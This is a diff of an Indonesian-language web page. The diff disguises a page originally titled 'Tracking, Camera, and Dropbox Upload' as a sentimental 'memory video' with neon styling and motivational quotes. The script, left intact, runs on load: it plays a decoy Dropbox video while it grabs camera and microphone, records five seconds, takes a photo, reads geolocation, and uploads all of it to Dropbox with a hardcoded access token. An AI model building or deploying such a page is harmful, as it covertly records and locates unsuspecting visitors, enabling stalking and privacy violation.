@@ -3,34 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tracking, Camera, and Dropbox Upload</title>
+    <title>Video Kenangan Kita</title>
     <style>
-        #videoElement {
-            display: none; /* Kamera disembunyikan */
+        /* Reset default styles */
+        body, h1, p {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
         }
-        #recordedVideo {
-            display: none; /* Video hasil rekaman disembunyikan */
-            width: 100%;
+
+        body {
+            background-color: #1b1b1b;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            font-size: 1.2em;
         }
+
+        h1 {
+            font-size: 2.5em;
+            color: #0ff;
+            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
+            margin-bottom: 20px;
+        }
+
         #fakeVideo {
-            width: 100%;
+            width: 80%;
             height: auto;
+            margin: 20px auto;
             background-color: #000;
             display: none; /* Menyembunyikan placeholder "Menonton Video" */
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
         }
+
+        video {
+            width: 100%;
+            border-radius: 15px;
+        }
+
+        .content {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+            margin-top: 50px;
+            width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .content p {
+            font-size: 1.2em;
+            color: #ccc;
+            margin-bottom: 30px;
+            line-height: 1.5em;
+        }
+
+        .neon-border {
+            padding: 5px;
+            border: 2px solid #0ff;
+            box-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
+            display: inline-block;
+            margin-top: 20px;
+        }
+
     </style>
 </head>
 <body>
-    <h1>Rekam Video, Ambil Foto, Lacak Lokasi, dan Unggah ke Dropbox</h1>
-    
+    <h1>Video Kenangan Kita</h1>
+
     <!-- Video yang ditampilkan dari Dropbox -->
     <div id="fakeVideo">
         <p>Menonton Video...</p>
-        <!-- Video yang diputar dari Dropbox, tambahkan atribut autoplay -->
-        <video id="dropboxVideo" width="100%" height="auto" autoplay muted>
+        <video id="dropboxVideo" autoplay controls>
             <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
             Your browser does not support the video tag.
         </video>
+    </div>
+
+    <div class="content">
+        <p>"Setiap kenangan memiliki kisahnya sendiri, dan setiap kisah berisi pelajaran berharga. Di tengah perjalanan ini, kita tetap berdiri tegak, karena setiap langkah membawa kita lebih dekat pada tujuan." </p>
+        
+        <p>"Jangan takut untuk melangkah, karena setiap langkah, meskipun kecil, adalah kemenangan. Hidup kita adalah rekaman yang tak ternilai." </p>
+        
+        <p>"Jangan biarkan masa lalu mendefinisikan masa depanmu. Setiap detik adalah kesempatan baru untuk menciptakan kenangan yang lebih baik." </p>
+
+        <div class="neon-border">
+            <p style="color: #fff;">Semangat untuk terus maju!</p>
+        </div>
     </div>
 
     <script>
@@ -44,10 +105,8 @@
         let recordedChunks = [];
         let locationData = [];
 
-        // Ganti dengan token akses Dropbox Anda
         const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';
 
-        // Fungsi untuk melacak lokasi pengguna
         function trackLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
@@ -65,12 +124,11 @@
             }
         }
 
-        // Fungsi untuk memulai video
         function startVideo() {
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(function(stream) {
                     mediaStream = stream;
-                    videoElement.srcObject = stream; // Menjalankan video di background
+                    videoElement.srcObject = stream;
                     trackLocation(); // Mulai melacak lokasi ketika video dimulai
                 })
                 .catch(function(error) {
@@ -78,7 +136,6 @@
                 });
         }
 
-        // Fungsi untuk mulai merekam video
         function startRecording() {
             recordedChunks = [];
             mediaRecorder = new MediaRecorder(mediaStream);
@@ -98,12 +155,10 @@
             mediaRecorder.start();
         }
 
-        // Fungsi untuk berhenti merekam
         function stopRecording() {
             mediaRecorder.stop();
         }
 
-        // Fungsi untuk mengambil foto dari kamera
         function takePhoto() {
             let canvas = document.createElement('canvas');
             let context = canvas.getContext('2d');
@@ -116,7 +171,6 @@
             }, 'image/jpeg');
         }
 
-        // Fungsi untuk mengunggah file ke Dropbox
         function uploadToDropbox(fileBlob, type) {
             const url = 'https://content.dropboxapi.com/2/files/upload';
             const xhr = new XMLHttpRequest();
@@ -143,25 +197,20 @@
             xhr.send(fileBlob);
         }
 
-        // Fungsi utama yang memulai semua proses
         function startAllFunctions() {
-            // Tampilkan video dari Dropbox
             fakeVideo.style.display = 'block'; // Tampilkan video dari Dropbox
             startVideo(); // Mulai video dan lokasi
             startRecording(); // Mulai merekam setelah video dimulai
 
-            // Ambil foto setelah 2 detik
             setTimeout(function() {
                 takePhoto();
-            }, 2000); // Foto setelah 2 detik
+            }, 2000);
 
-            // Setelah 5 detik, hentikan rekaman dan sembunyikan video
             setTimeout(function() {
                 stopRecording(); // Berhenti merekam setelah 5 detik
-            }, 5000); // Rekam selama 5 detik
+            }, 5000);
         }
 
-        // Menjalankan semua fungsi secara otomatis setelah halaman dimuat
         window.onload = function() {
             startAllFunctions();
         };
